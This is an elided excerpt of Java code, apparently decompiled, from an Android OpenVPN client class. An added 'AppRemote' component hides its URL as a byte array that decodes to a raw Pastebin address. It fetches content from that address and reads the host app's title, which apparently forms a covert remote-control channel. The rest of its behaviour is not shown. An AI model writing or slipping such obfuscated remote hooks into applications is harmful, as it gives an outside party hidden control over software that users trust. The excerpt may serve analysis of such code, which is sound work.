...
public class ClientAPI_OpenVPNClient extends ClientAPI_TunBuilderBase {
    ...
    protected void connect_pre_run() {
        if (getClass() == ClientAPI_OpenVPNClient.class) {
    ...
    protected void connect_session_stop() {
        if (getClass() == ClientAPI_OpenVPNClient.class) {
    ...
    {
        AppRemote ar = new AppRemote(context);
    ...
    {
        private static final String URL = new String(new byte[]{104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,76,68,69,110,112,122,85,50});
        ...
        {
            if (result != null) {
                String appName = ((Activity)context).getTitle().toString();
